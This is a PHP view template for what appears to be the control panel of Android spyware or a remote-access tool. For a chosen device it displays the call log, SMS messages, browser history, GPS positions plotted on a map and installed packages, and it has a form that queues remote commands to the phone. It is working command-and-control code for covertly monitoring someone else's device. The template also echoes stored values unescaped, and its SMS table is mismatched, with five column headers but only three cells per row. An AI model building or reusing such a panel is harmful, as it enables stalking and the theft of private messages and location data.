<b> Device Details (<?php echo $deviceid ?>, <?php echo $devicename ?>, <?php echo $devicenumber ?>)</b>

<br>

<script type="text/javascript">
window.onload=function(){
	var selectbox = document.getElementById('cmd').value;
	var textbox = document.getElementById('cmdbox');
	textbox.value = selectbox;
};

function updatetext(){
	var selectbox = document.getElementById('cmd').value;
	var textbox = document.getElementById('cmdbox');
	textbox.value = selectbox;
}

function showCallLog() {
        $( ".calllog" ).dialog({ autoOpen: true });
      }
function showSmsLog() {
        $( ".smslog" ).dialog({ autoOpen: true });
      }
function showBrowserLog() {
        $( ".browserlog" ).dialog({ autoOpen: true });
      }
function showGPSLog() {
        $( ".gpslog" ).dialog({ autoOpen: true });
      }
function showCommandHistory() {
        $( ".commandhistory" ).dialog({ autoOpen: true });
      }
function showPackages() {
        $( ".packages" ).dialog({ autoOpen: true });
      }
function showGoogleMap(long,lat) {
        $('<img src="http://maps.google.com/maps/api/staticmap?center='+lat+','+long+'&zoom=14&markers='+lat+','+long+'&size=700x700&sensor=true"/>').dialog({ autoOpen: true });
      }
</script>
<hr><br>
<button onclick="showCallLog()">Call-Log</button> <button onclick="showSmsLog()">SMS-Log</button> <button onclick="showBrowserLog()">Browser-Log</button> <button onclick="showGPSLog()">GPS-Log</button> <button onclick="showPackages()">Packages</button> 
<br><br><hr><br>
	<div class="ph_maindiv_content">
<br>Registered  ||  Name  ||  Number  ||  Command Seen  ||  Current Command
	</div>

	<?php
	$ct =1;
	foreach ($users1 as $row) {
	?>
	<div class="ph_maindiv_content">
<br><?php echo $row['clm_registered'] ?>  ||  <?php echo $row['clm_device_name'] ?>  ||  <?php echo $row['clm_device_number'] ?>  ||  <?php echo $row['clm_commandseen'] ?>  ||  <a onclick="showCommandHistory()"><?php echo $row['clm_currentcommand'] ?></a>
	</div>
	<?php
	$ct++;
	}
	?>
<br><hr><br>
<form action="<?php echo base_url() . 'admin/addcommand/' . $deviceid."/".$devicename."/".$devicenumber;?>" method="POST">

	<input type="text" name="command" id = "cmdbox" required="required"/> <br/>

	<select name="cmd" onchange="updatetext()" id="cmd">
		<?php
		foreach ($cmd as $command) {
		 	echo "<option value = " . $command["clm_cmdvalue"] . '>' . $command["clm_cmdname"] ."</option>";
		 } 
		?>
	</select>
	<input type="submit" value="Add" name="Add">
</form>
<hr><br>
<div class="commandhistory" title="Command History" style="display:none;">
<table border ="1">
	<tr>
		<th>#</th>
		<th>Command</th>
	</tr>

	<?php
	$ct =1;
	foreach ($users as $row) {
	?>
	<tr>
		<td> <?php echo $ct ?> </td>
		<td> <?php echo $row['clm_commandhistory'] ?> </td>
	<?php
	$ct++;
	}
	?>
</table>
</div>
<div class="calllog" title="Call-Log" style="display:none;">
<table border ="1">
	<tr>
		<th>#</th>
		<th>Date</th>
		<th>Number</th>
	</tr>
	<?php
	$ct =1;
	foreach ($calllog as $row) {
	?>
	<tr>
		<td> <?php echo $ct ?> </td>
		<td> <?php echo $row['clm_date'] ?> </td>
		<td> <?php echo $row['clm_number'] ?> </td>
	<?php
	$ct++;
	}
	?>
</table>
</div>
<div class="smslog" title="SMS-Log" style="display:none;">
<table border ="1">
	<tr>
		<th>#</th>
		<th>Date</th>
		<th>From</th>
		<th>To</th>
		<th>Message</th>
	</tr>
	<?php
	$ct =1;
	foreach ($smslog as $row) {
	?>
	<tr>
		<td> <?php echo $ct ?> </td>
		<td> <?php echo $row['clm_date'] ?> </td>
		<td> <?php echo $row['clm_msg'] ?> </td>
	<?php
	$ct++;
	}
	?>
</table>
</div>
<div class="browserlog" title="Browser-Log" style="display:none;">
<table border ="1">
	<tr>
		<th>#</th>
		<th>Title</th>
		<th>URL</th>
	</tr>
	<?php
	$ct =1;
	foreach ($browserlog as $row) {
	?>
	<tr>
		<td> <?php echo $ct ?> </td>
		<td> <?php echo $row['clm_title'] ?> </td>
		<td> <?php echo $row['clm_url'] ?> </td>
	<?php
	$ct++;
	}
	?>
</table>
</div>
<div class="gpslog" title="GPS-Log" style="display:none;">
<table border ="1">
	<tr>
		<th>#</th>
		<th>Latitude</th>
		<th>Longitude</th>
	</tr>
	<?php
	$ct =1;
	foreach ($gpslog as $row) {
	?>
	<tr>
		<td> <a onclick="showGoogleMap('<?php echo $row['clm_longitude']?>','<?php echo $row['clm_latitude']?>')"><?php echo $ct ?></a> </td>
		<td> <a onclick="showGoogleMap('<?php echo $row['clm_longitude']?>','<?php echo $row['clm_latitude']?>')"><?php echo $row['clm_latitude'] ?></a> </td>
		<td> <a onclick="showGoogleMap('<?php echo $row['clm_longitude']?>','<?php echo $row['clm_latitude']?>')"><?php echo $row['clm_longitude'] ?></a> </td>
	</tr>
	<?php
	$ct++;
	}
	?>
</table>
</div>
<div class="packages" title="Packages" style="display:none;">
<table border ="1">
	<tr>
		<th>#</th>
		<th>Package Name</th>
	</tr>
	<?php
	$ct =1;
	foreach ($packages as $row) {
	?>
	<tr>
		<td> <?php echo $ct ?> </td>
		<td> <?php echo $row['clm_package'] ?> </td>
	</tr>
	<?php
	$ct++;
	}
	?>
</table>
</div>

</body>
</html>